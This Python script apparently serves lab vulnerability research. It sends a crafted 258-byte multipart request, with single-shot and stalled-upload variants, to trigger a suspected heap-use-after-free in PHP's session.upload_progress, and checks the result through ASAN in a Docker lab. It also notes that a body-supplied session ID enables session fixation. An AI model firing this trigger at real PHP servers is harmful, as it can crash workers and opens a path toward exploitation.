#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Canonical 258-byte trigger for session.upload_progress (php2shell).

Request shape (the minimal form documented by the public PoCs):

    --b
    Content-Disposition: form-data; name="PHPSESSID"

    aaaa... (32 chars)
    --b
    Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

    x
    --b
    Content-Disposition: form-data; name="f"; filename="a"

    Z
    --b--

Notes relevant to the analysis:
  * The SID travels in the BODY (PHPSESSID field), not in a cookie: PHP
    accepts it even with session.use_only_cookies=1 (session fixation vector).
  * With min_freq=0 the update() of the FILE_DATA event runs immediately after
    the update() of FILE_START: the second update() re-reads the session file
    and track_init() destroys the previous tree -> that is the point where the
    cached pointers would dangle IF the live array were not protected by
    Z_TRY_ADDREF(progress->data).
  * --stall mode: variant that pauses between file bytes to force a second
    FILE_DATA event within the min_freq window.

This script includes NO exploitation payload: it only sends the request and
checks whether the server under ASAN reports a heap-use-after-free.
"""

import argparse
import socket
import sys
import time

BOUNDARY = "----b"
SID = "a" * 32


def build_body(sid: str = SID, progress_key: str = "x", filename: str = "a") -> bytes:
    h = f"--{BOUNDARY}\r\n"
    body = (
        h
        + 'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
        + sid + "\r\n"
        + h
        + 'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        + progress_key + "\r\n"
        + h
        + f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n\r\n'
        + "Z" + "\r\n"
        + "--" + BOUNDARY + "--\r\n"
    )
    return body.encode("ascii")


def build_request(body: bytes, path: str) -> bytes:
    return (
        f"POST {path} HTTP/1.1\r\n".encode()
        + b"Host: 127.0.0.1\r\n"
        + b"Content-Type: multipart/form-data; boundary=" + BOUNDARY.encode() + b"\r\n"
        + b"Content-Length: " + str(len(body)).encode() + b"\r\n"
        + b"Connection: close\r\n"
        + b"\r\n"
        + body
    )


def recv_all(s, timeout):
    resp = b""
    s.settimeout(timeout)
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp += chunk
    except (socket.timeout, OSError):
        pass
    return resp


def send_single(host, port, path, timeout=5.0):
    """Main routine: a single fast POST."""
    s = socket.create_connection((host, port), timeout=10)
    try:
        s.sendall(build_request(build_body(), path))
        return recv_all(s, timeout)
    finally:
        s.close()


def send_with_stall(host, port, path, stall=1.5, rounds=6, timeout=5.0):
    """Fallback: file bytes with pauses > min_freq (second FILE_DATA)."""
    req = build_request(build_body(), path)
    marker = b'filename="a"\r\n\r\n'
    p = req.index(marker) + len(marker)
    stage1, tail = req[:p], req[p:]
    one_byte, closing = tail[:1], tail[1:]
    s = socket.create_connection((host, port), timeout=10)
    try:
        s.sendall(stage1 + one_byte)
        time.sleep(stall)
        for _ in range(rounds):
            s.sendall(one_byte)
            time.sleep(stall)
        s.sendall(closing)
        return recv_all(s, timeout)
    finally:
        s.close()


def report(resp, label):
    head = resp.split(b"\r\n", 1)[0] if resp else b""
    status = head.split(b" ", 2)[1].decode("latin1", "replace") if b" " in head else "?"
    print(f"[*] {label}: HTTP {status} ({len(resp)}B)")
    return status


def main():
    ap = argparse.ArgumentParser(description="Canonical 258B session.upload_progress trigger")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8080)
    ap.add_argument("--path", default="/")
    ap.add_argument("--stall", type=float, default=1.5)
    ap.add_argument("--rounds", type=int, default=6)
    ap.add_argument("--self-test", action="store_true")
    args = ap.parse_args()

    body = build_body()
    if args.self_test:
        assert len(body) == 258, f"len {len(body)} != 258"
        print(f"[+] self-test OK: body={len(body)}B (update_step at 1% = {len(body)//100})")
        return 0

    print(f"[*] target {args.host}:{args.port}{args.path} body={len(body)}B")
    try:
        resp = send_single(args.host, args.port, args.path)
        report(resp, "PRIMARY single-shot")
        time.sleep(1.0)
        resp2 = send_with_stall(args.host, args.port, args.path, args.stall, args.rounds)
        report(resp2, "FALLBACK stall-routine")
    except (ConnectionResetError, BrokenPipeError, OSError) as e:
        print(f"[!] connection reset ({e.__class__.__name__}): possible worker crash")
        return 1

    print("[*] Check ASAN with: docker logs php-uaf-lab 2>&1 | grep -B5 -A45 AddressSanitizer")
    return 0


if __name__ == "__main__":
    sys.exit(main())
